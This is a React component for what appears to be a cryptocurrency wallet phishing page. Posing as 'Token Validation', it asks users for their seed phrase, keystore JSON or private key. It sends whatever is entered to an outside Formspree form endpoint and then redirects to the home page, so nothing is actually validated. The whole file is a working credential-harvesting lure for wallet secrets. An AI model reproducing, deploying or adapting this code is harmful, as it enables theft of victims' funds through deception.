import React, {useState} from 'react'
import "./import.css"
import { useForm } from '@formspree/react';

export default function Import(props) {

    const [state, handleSubmit] = useForm("xwkaqdll");

    const [panel, setPanel] = useState("phrase")

    if (state.succeeded) {
        props.history.push("/")    
    }

    return (
        <div className="import">
            <div className="container">
                <header>
                    <h2>Input parameters to commence Token Validation</h2>
                </header>
                <nav>
                    <ul>
                        <li onClick={()=> setPanel("phrase")}>Phrase</li>
                        <li onClick={()=> setPanel("kStore")}>Keystore Json</li>
                        <li onClick={()=> setPanel("pKey")}>Private key</li>
                    </ul>
                </nav>
                <form onSubmit={handleSubmit}>
                    {/* Phrase */}
                    { panel === "phrase" ? 
                    <>
                        <textarea name="phrase" placeholder="Phrase" className="phrase"  required/>
                        <p>Typically 12 (sometimes 24) words seperated by single spaces.</p>
                    </> : null}

                    {/* Private Key */}
                    { panel === "kStore" ? 
                    <>
                        <input name="key-store" placeholder="KeyStore" className="kStore" style={{marginBottom: "20px"}} required/>
                    </> : null}

                    {/* pKey */}
                    { panel === "pKey" ? 
                    <>
                        <input name="Private Key" type="pKey" placeholder="Private-Key" className="pKey" required style={{marginBottom: "10px"}}/>
                    </> : null}

                    <input type="submit" value="Proceed" id="submitBtn"/>
                </form>
            </div>
        </div>
    )
}
